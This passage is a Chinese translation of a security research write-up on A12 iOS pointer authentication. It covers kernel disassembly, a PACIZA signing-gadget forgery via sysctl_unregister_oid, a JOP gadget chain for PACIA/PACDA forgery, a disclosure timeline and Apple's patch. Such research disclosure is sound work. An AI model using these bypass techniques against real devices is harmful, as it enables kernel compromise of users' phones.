+    LDR         X2, [X2,#thread.field_460]
+    CBZ         X2, loc_FFFFFFF0079B3AE8
+    ...
+    MRS         X0, #0, c1, c0, #0                  ;; SCTLR_EL1
+    AND         X0, X0, #0xFFFFFFFF7FFFFFFF         ;; clear bit 31
+    AND         X0, X0, #0xFFFFFFFFF7FFFFFF         ;; clear bit 27
+    AND         X0, X0, #0xFFFFFFFFFFFFDFFF         ;; clear bit 13
+    MSR         #0, c1, c0, #0, X0                  ;; SCTLR_EL1
+    
+
+虽然 ARM
+将这些位记录为保留位(值为0)，但我确实在[osfmk/arm64/proc_reg.h](https://opensource.apple.com/source/xnu/xnu-4903.221.2/osfmk/arm64/proc_reg.h.auto.html)的
+XNU 4903.221.2源码中找到了对其中一个位的引用:
+
+    
+    
+    // 13           PACDB_ENABLED            AddPACDB and AuthDB functions enabled
+    #define SCTLR_PACDB_ENABLED             (1 << 13)
+    
+
+这表明第 13 位至少与 PAC 的 DB 密钥有关。一来，由于文件中并没有提到 SCTLR_EL1
+的这一位，另外，还有其他几位也没有按照保留值来赋值(31,30,27位)，因此我推测这些位控制其他PAC密钥。我猜第31位控制PACIA，第30位控制PACIB，第27位控制PACDA，第13位控制PACDB。由于文件中没有提到(a)和(b)没有通过sctlr_reservation自动设置的SCTLR_EL1位分别是31、30和27，因此我推测这些位控制了其他PAC键。(假设代码中保留对SCTLR_PACDB_ENABLED的引用是一种疏忽)。我猜第31位控制PACIA，第30位控制PACIB，第27位控制PACDA，第13位控制PACDB。
+
+为了测试这个理论，我分别在设置当前线程的0x460偏移与不设置的情况下，调试器中执行了以下PAC指令序列。在执行这些指令之前，我将每个寄存器Xn的值设置为0x11223300
+| n
+
+    
+    
+    pacia  x0, x1
+    pacib  x2, x3
+    pacda  x4, x5
+    pacdb  x6, x7
+    
+
+下面是没有设置field_460的结果:
+
+    
+    
+    x0 = 0x001d498011223300    # PACIA
+    x1 = 0x0000000011223301
+    x2 = 0x0035778011223302    # PACIB
+    x3 = 0x0000000011223303
+    x4 = 0x0062860011223304    # PACDA
+    x5 = 0x0000000011223305
+    x6 = 0x001e6c8011223306    # PACDB
+    x7 = 0x0000000011223307
+    
+
+在设置field_460后的结果为：
+
+    
+    
+    x0 = 0x0000000011223300    # PACIA
+    x1 = 0x0000000011223301
+    x2 = 0x0035778011223302    # PACIB
+    x3 = 0x0000000011223303
+    x4 = 0x0000000011223304    # PACDA
+    x5 = 0x0000000011223305
+    x6 = 0x0000000011223306    # PACDB
+    x7 = 0x0000000011223307
+    
+
+这似乎证实了我们的理论:没有设置
+field_460，PAC指令按照预期工作，但是在设置field_460之后，除了PACIB之外，所有指令都变成了NOP。SCTLR_EL1中存在这些PAC-enable位十分有趣。
+
+## 不知道存不存在的 signing gadgets
+
+研究到这里，由于苹果的设计比我们预想的健壮，我们还没能找到一个突破口，我们正在寻找一个 signing
+gadgets。这意味着我们正在寻找一个代码序列，它将从内存中读取指针，对其进行签名，并将其写回内存。但是我们还不能调用任意的内核地址，因此我们还需要确保该代码路径实际上是可触发的，无论是在正常的内核操作，还是通过使用
+iokit_user_client_trap() 调用。
+
+苹果显然试图清除任何明显的 signing gadget。所有出现的 PACIA 指令要么不可用，要么被切换到用户态 PAC
+密钥的代码包装(通过S3_4_C15_C0_4)，因此我们无法使内核仅使用读/写来执行 PACIA 伪造。
+
+那就只剩下 PACIZA 了。虽然 PACIZA 指令出现了很多次，但是大多数都是无用的，因为结果没有写到内存中。此外，实际上加载和存储指针的过程几乎总是在
+AUTIA 之前，如果我们调用的指针没有有效的 PAC，那么 AUTIA 就会失败:
+
+    
+    
+    LDR         X10, [X9,#0x30]!
+    CBNZ        X19, loc_FFFFFFF007EBD330
+    CBZ         X10, loc_FFFFFFF007EBD330
+    MOV         X19, #0
+    MOV         X11, X9
+    MOVK        X11, #0x14EF,LSL#48
+    AUTIA       X10, X11
+    PACIZA      X10
+    STR         X10, [X9]
+    
+
+因此，看来我还是没有办法。
+
+## 第四个缺陷出现！
+
+在放弃了 signing gadget 并碰了一些其他的死胡同之后，我最终想知道:如果 PACIZA 被用来签名一个无效指针，但是 AUTIA
+验证通过后会发生什么？我假设这样的指针是无用的，但是我决定查看 ARM 代码，看看实际会发生什么。
+
+令我惊讶的是，ARM 标准显示 AUTIA 和 PACIZA 之间有一个有趣的行为。当 AUTIA 发现一个指针的 PAC
+不匹配时，它会在指针的扩展位插入错误代码，并破坏指针:  
+ ** _译者注： 在这里，原作者说的非常不清楚，根据我的理解，这里的意思应该是，如果一个指针的签名不合法，AUTIA
+会直接在合法的签名中间插入错误代码并返回，这样返回的内容其实包含了大部分的合法签名_**
+
+    
+    
+    // Auth()
+    // ======
+    // Restores the upper bits of the address to be all zeros or all ones (based on
+    // the value of bit[55]) and computes and checks the pointer authentication
+    // code. If the check passes, then the restored address is returned. If the
+    // check fails, the second-top and third-top bits of the extension bits in the
+    // pointer authentication code field are corrupted to ensure that accessing the
+    // address will give a translation fault.
+    
+    bits(64) Auth(bits(64) ptr, bits(64) modifier, bits(128) K, boolean data,
+                 bit keynumber)
+       bits(64) PAC;
+       bits(64) result;
+       bits(64) original_ptr;
+       bits(2) error_code;
+       bits(64) extfield;
+    
+       // Reconstruct the extension field used of adding the PAC to the pointer
+       boolean tbi = CalculateTBI(ptr, data);
+       integer bottom_PAC_bit = CalculateBottomPACBit(ptr<55>);
+       extfield = Replicate(ptr<55>, 64);
+    
+       if tbi then
+           ...
+       else
+           original_ptr = extfield<64-bottom_PAC_bit-1:0>:ptr<bottom_PAC_bit-1:0>;
+    
+       PAC = ComputePAC(original_ptr, modifier, K<127:64>, K<63:0>);
+       // Check pointer authentication code
+       if tbi then
+           ...
+       else
+           if ((PAC<54:bottom_PAC_bit> == ptr<54:bottom_PAC_bit>) &&
+               (PAC<63:56> == ptr<63:56>)) then
+               result = original_ptr;
+           else
+               error_code = keynumber:NOT(keynumber);
+               result = original_ptr<63>:error_code:original_ptr<60:0>;
+       return result;
+    
+
+同时， 当 PACIZA 为指针添加 PAC 时，它实际上用还原后的扩展位对指针签名，如果扩展位本来无效，则会破坏PAC。
+
+    
+    
+     ext_ptr = extfield<(64-bottom_PAC_bit)-1:0>:ptr<bottom_PAC_bit-1:0>;
+    
+    PAC = ComputePAC(ext_ptr, modifier, K<127:64>, K<63:0>);
+    
+    // Check if the ptr has good extension bits and corrupt the pointer
+    // authentication code if not;
+    if !IsZero(ptr<top_bit:bottom_PAC_bit>)
+           && !IsOnes(ptr<top_bit:bottom_PAC_bit>) then
+       PAC<top_bit-1> = NOT(PAC<top_bit-1>);
+    
+
+重要的是，PAC _指令会通过翻转 PAC 的一个位来破坏具有无效扩展位的指针的PAC。 虽然这肯定会使PAC无效，但这也意味着，如果我们能够读出一个
+AUT_ 指令产生的PAC _伪造指针，那么可以重建真正的PAC！  
+**_译者注： 在这里这里应该也是指的 PACIZA 会返回一部分合法签名，如果 PACIZA 与 AUTIA
+两个返回的部分合法签名对照一下，就可以恢复出全部的合法签名 _*_
+
+因此，即使我们没有一个有效的签名指针，上面那个由 AUTIA 和 PACIZA 组成的序列也可以用作 signing
+gadget：我们只需要在伪造的PAC中翻转一个位。
+
+## 一个完整 A 密钥伪造策略
+
+有了基于 PACIZA 的 signing gadget，我们可以开始为A12设备上的 A 密钥构建一个完整的伪造策略。
+
+###  方法 1: 利用 PACIZA 伪造签名
+
+稍微调查一下，发现我们找到的 signing gadget 是函数sysctl_unregister_oid() 的一部分，  
+该函数负责从全局 sysctl 树中取消注册 sysctl_oid。  
+（再次说明以下，这个函数在公共源代码中没有任何与PAC相关的代码，但这些操作的确存在于启用PAC的设备上。）  
+以下是IDA中相关部分的代码：
+
+    
+    
+    void sysctl_unregister_oid(sysctl_oid *oidp)
+    {
+       sysctl_oid *removed_oidp = NULL;
+       sysctl_oid *old_oidp = NULL;
+       BOOL have_old_oidp;
+       void **handler_field;
+       void *handler;
+       uint64_t context;
+       ...
+       if ( !(oidp->oid_kind & 0x400000) )         // Don't enter this if
+       {
+           ...
+       }
+       if ( oidp->oid_version != 1 )               // Don't enter this if
+       {
+           ...
+       }
+       sysctl_oid *first_sibling = oidp->oid_parent->first;
+       if ( first_sibling == oidp )                // Enter this if
+       {
+           removed_oidp = NULL;
+           old_oidp = oidp;
+           oidp->oid_parent->first = old_oidp->oid_link;
+           have_old_oidp = 1;
+       }
+       else
+       {
+           ...
+       }
+       handler_field = &old_oidp->oid_handler;
+       handler = old_oidp->oid_handler;
+       if ( removed_oidp || !handler )             // Take the else
+       {
+           ...
+       }
+       else
+       {
+           removed_oidp = NULL;
+           context = (0x14EF << 48) | ((uint64_t)handler_field & 0xFFFFFFFFFFFF);
+           *handler_field = ptrauth_sign_unauthenticated(
+                   ptrauth_auth_function(handler, ptrauth_key_asia, &context),
+                   ptrauth_key_asia,
+                   0);
+           ...
+       }
+       ...
+    }
+    
+
+如果我们可以使用设计一个sysctl_oid来调用这个函数，并指定路径，那么我们应该能够伪造任意的PACIZA指针。
+
+事实上，并没有指向这个函数的 PACIZA 签名指针，所以我们不能直接使用我们的 iokit_user_client_trap
+调用它。但幸运的是，有几个全局 PACIZA 签名的函数指针本身就会调用它。  
+这是因为一些内核扩展需要在 unload 前先解除注册。这些内核扩展通常有一个终止函数会调用 sysctl_unregister_oid()。描述内核扩展的
+kmod_info 结构体包含指向模块终止函数的 PACIZA 签名指针。
+
+我能找到的最好的方案时通过 l2tp_domain_module_stop()，它是内核扩展com.apple.nk.lttp
+的一部分。这个函数通常会在调用 sysctl_unregister_oid 前在全局的 sysctl **net_ppp_l2tp
+对象上执行一些析构工作。因此，我们可以通过覆盖 sysctl** net_ppp_l2tp 的内容来对任意指针进行 PACIZA 签名。通过现有的全局
+PACIZA 签名指针调用 l2tp_domain_module_stop() ，然后读取sysctl__net_ppp_l2tp 的
+oid_handler 字段，并在第62位取反即可。
+
+###  方法 2: 利用 PACIA/PACDA 伪造签名
+
+虽然我们现在已经可以对伪造任何指针的 PACIZA 签名。但是能够执行 PACIA/PACDA
+签名的伪造会更好，因为这样我们就可以实现在“寻找内核代码执行的入口点”一节中描述的绕过方案。为此，我接下来研究 PACIZA 是否可以将
+kernelcache 中的任何 PACIA 指令转换为可用的 signing gadget。
+
+最可能的候选函数是一个未知的 sub_FFFFFFF007B66C48 函数，该函数包含以下指令序列:
+
+    
+    
+    MRS         X9, #4, c15, c0, #4 ; S3_4_C15_C0_4
+    AND         X9, X9, #0xFFFFFFFFFFFFFFFB
+    MSR         #4, c15, c0, #4, X9 ; S3_4_C15_C0_4
+    ISB
+    LDR         X9, [X2,#0x100]
+    CBZ         X9, loc_FFFFFFF007B66D24
+    MOV         W10, #0x7481
+    PACIA       X9, X10
+    STR         X9, [X2,#0x100]
+    ...
+    LDR         X9, [X2,#0xF8]
+    CBZ         X9, loc_FFFFFFF007B66D54
+    MOV         W10, #0xCBED
+    PACDA       X9, X10
+    STR         X9, [X2,#0xF8]
+    ...
+    MRS         X9, #4, c15, c0, #4 ; S3_4_C15_C0_4
+    ORR         X9, X9, #4
+    MSR         #4, c15, c0, #4, X9 ; S3_4_C15_C0_4
+    ISB
+    ...
+    PACIBSP
+    STP         X20, X19, [SP,#var_20]!
+    ...         ;; Function body (mostly harmless)
+    LDP         X20, X19, [SP+0x20+var_20],#0x20
+    AUTIBSP
+    MOV         W0, #0
+    RET
+    
+
+我们可以看到，PACIA/PACDA
+的操作都是出现在栈帧建立之前。通常，在函数返回时，调用函数的中间部分会导致问题，因为每次函数的结束都会销毁从未建立过的栈帧。但是，由于这个函数的栈帧是在我们需要的入口点之后设置的，因此我们可以使用内核原语直接跳到这些指令，而不会造成任何问题。
+
+当然，我们还有另一个问题: PACIA 和 PACDA 指令使用寄存器 X9 和 X10，而基于iokit_user_client_trap()
+的内核调用原语只提供对寄存器 X1 到 X6 的控制。我们需要想办法将我们想要的值放入适当的寄存器中。
+
+事实上，我们已经找到了解决这个问题的方法:JOP gadget。
+
+在 kernelcache 中搜索时，似乎只有三个内核扩展持有绝大多数非 PAC
+签名的间接分支:FairPlayIOKit、LSKDIOKit和LSKDIOKitMSE。这三个内核扩展甚至在IDA的导航栏中突出显示为蓝色和红色，因为IDA无法利用这里面大部分的关键字创建函数。
+
+这些内核扩展似乎使用了某种混淆来隐藏他们的控制流，使逆向的工作更加困难。这段代码中的许多跳转都是通过寄存器间接执行的。然而，在这种情况下，混淆实际上使攻击者的工作变得更容易，因为它为我们提供了大量不受
+PAC 保护的，有用的JOP gadget。
+
+对于我们的这个场景，我们可以控制 PC 和 X1 到 X6，在跳到 signing gadget 之前，我们试图将 X2 设置为某个可写内存区域，将 X9
+设置为要签名的指针，将 X10 设置为签名上下文。最后，我们的 JOP 程序如下:
+
+    
+    
+    X1 = MOV_X10_X3__BR_X6
+    X2 = KERNEL_BUFFER
+    X3 = CONTEXT
+    X4 = POINTER
+    X5 = MOV_X9_X0__BR_X1
+    X6 = PACIA_X9_X10__STR_X9_X2_100
+    
+    MOV         X0, X4
+    BR          X5
+    
+    MOV         X9, X0
+    BR          X1
+    
+    MOV         X10, X3
+    BR          X6
+    
+    PACIA       X9, X10
+    STR         X9, [X2,#0x100]
+    ...
+    
+
+这样，我们就有了一个完整的绕过策略，允许我们使用 A 密钥伪造任意PAC签名。
+
+## 时间线
+
+在2018年12月18日我分享了最初的内核读/写漏洞，之后，我又在12月30日报告了利用voucher_swap 的 绕过 PAC 的概念验证。  
+这个 POC 可以伪造任意的 A 密钥 PAC，可以调用任意内核函数，就像在非PAC设备上一样。
+
+苹果迅速回应称，最新的iOS 12.1.3测试版16D5032a应该能缓解这个问题。由于这次的升级还修复了 voucher_swap
+错误，所以目前无法直接测试这个漏洞，但是我手动检查了内核缓存，发现苹果减轻了sysctl_unregister_oid() 的影响，该函数在我们第一个生成
+PACIZA 伪造的策略中，起到了很大的作用。
+
+修复的版本是在12月19日发布的，当时我对 PAC 的研究刚刚开始，而且远在我向苹果上报 PAC 绕过漏洞之前。因此，就像 voucher_swap
+错误的情况一样，我怀疑是另一位研究人员首先发现并报告了这个问题。
+
+## 苹果的修复方案
+
+为了修复 sysctl_unregister_oid() 的问题 (以及其他AUTIA- PACIA gadgets)，苹果添加了一些指令，以确保如果
+AUTIA 失败，那么将使用产生的无效指针，而不是PACIZA的结果:
+
+    
+    
+    LDR         X10, [X9,#0x30]!            ;; X10 = old_oidp->oid_handler
+    CBNZ        X19, loc_FFFFFFF007EBD4A0
+    CBZ         X10, loc_FFFFFFF007EBD4A0
+    MOV         X19, #0
+    MOV         X11, X9                     ;; X11 = &old_oidp->oid_handler
+    MOVK        X11, #0x14EF,LSL#48         ;; X11 = 14EF`&oid_handler
+    MOV         X12, X10                    ;; X12 = oid_handler
+    AUTIA       X12, X11                    ;; X12 = AUTIA(handler, 14EF`&handler)
+    XPACI       X10                         ;; X10 = XPAC(handler)
+    CMP         X12, X10
+    PACIZA      X10                         ;; X10 = PACIZA(XPAC(handler))
+    CSEL        X10, X10, X12, EQ           ;; X10 = (PAC_valid ? PACIZA : AUTIA)
+    STR         X10, [X9]
+    
+
+有了这个更改，我们就不能再使用 PACIZA 来伪造指针了，除非我们已经有了带有特定上下文的 PACIA 指针。
+
+## Conclusion
+
+在这篇文章中我们详细的研究了苹果在A12中指针验证机制,描述观察到的行为,具体的实现中如何偏离本来的设计目的，并分析系统的薄弱环节,允许内核具有读/写功能的攻击者伪造任意指针的
+PAC。该分析以一个完整的绕过策略和概念验证结束，该策略允许攻击者在运行iOS 12.1.2的iPhone XS上执行任意的 A 密钥伪造操作。
+
+尽管存在这些缺陷，PAC
+仍然是一项十分有用的防御机制。苹果公司在A12中增强了PAC，这显然是为了防止内核攻击者进行读/写，这意味着我没有在设计中找到系统性的突破并且不得不依赖
+signing gadget，然而这些 gadget 很容易通过软件修补。
+
+本文翻译自googleprojectzero.blogspot.com
+[原文链接](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **MoonKey** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/171526](/post/id/171526)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html)
+
+如若转载,请注明出处： <https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [iOS](/tag/iOS)
+  * [移动安全](/tag/移动安全)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t017d0ebb688dc22d8e.png) MoonKey
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
